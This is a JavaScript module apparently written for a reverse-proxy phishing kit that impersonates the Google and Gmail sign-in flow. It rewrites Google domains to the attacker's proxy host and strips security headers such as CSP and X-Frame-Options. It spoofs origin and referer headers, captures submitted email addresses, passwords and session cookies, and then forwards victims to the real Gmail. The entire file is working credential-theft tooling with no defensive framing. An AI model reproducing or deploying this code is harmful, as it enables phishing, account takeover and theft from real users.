/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()
    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
            {
                reg: /accounts\.google\.com/igm,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /www\.google\.com/igm,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /gstatic\.com/igm,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/igm,
                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
            }
        ]
    }

    processResponse(clientContext) {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')

        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            if (rLocation.startsWith('https://myaccount.google.com') || 
                rLocation.startsWith('https://accounts.google.com/signin/oauth') ||
                rLocation.startsWith('https://mail.google.com')) {
                return this.afterEmailPath()
            }
        }

        return super.processResponse(clientContext)
    }

    afterEmailPath() {
        this.browserEndPoint.setHeader('location', '/auth/gmail/finish')
        this.browserEndPoint.end('')
    }
}

const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        super.loadAutoGrab(configExport.AUTOGRAB_CODE)

        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
        this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'accounts.google.com') : ''
        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'accounts.google.com') : ''

        // Check for redirect
        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            if (redirectToken.url.startsWith('https://myaccount.google.com') ||
                redirectToken.url.startsWith('https://mail.google.com') ||
                redirectToken.url.startsWith('https://accounts.google.com/signin/oauth')) {
                super.sendClientData(clientContext, {})
                return super.exitLink('https://mail.google.com')
            }

            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            this.req.url = reqCheck
            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url === '/auth/gmail/finish') {
            super.sendClientData(clientContext, {})
            this.res.writeHead('301', { location: 'https://mail.google.com' })
            return super.cleanEnd('PHP-EXEC', clientContext)
        }

        return super.execute(clientContext)
    }
}

const configExport = {
    SCHEME: 'gmail',

    CURRENT_DOMAIN: 'accounts.google.com',

    AUTOGRAB_CODE: 'identifier',

    START_PATH: '/v3/signin/identifier?hl=en',

    COOKIE_PATH: ['/v3/signin/identifier', '/v3/signin/challenge/pwd'],

    EXIT_TRIGGER_PATH: [],

    EXIT_URL: 'https://mail.google.com/',

    EXTRA_COMMANDS: [],

    EXTERNAL_FILTERS: [
        'accounts.google.com',
        'www.google.com',
        'gstatic.com'
    ],

    PRE_HANDLERS: [],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        gmailEmail: {
            method: 'POST',
            params: ['identifier'],
            urls: '',
            hosts: ['accounts.google.com'],
        },

        gmailPassword: {
            method: 'POST',
            params: ['password', 'hiddenPassword'],
            urls: '',
            hosts: ['accounts.google.com'],
        },
    },

    //MODULE OPTIONS 
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: this.START_PATH,
        exitLink: '',
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport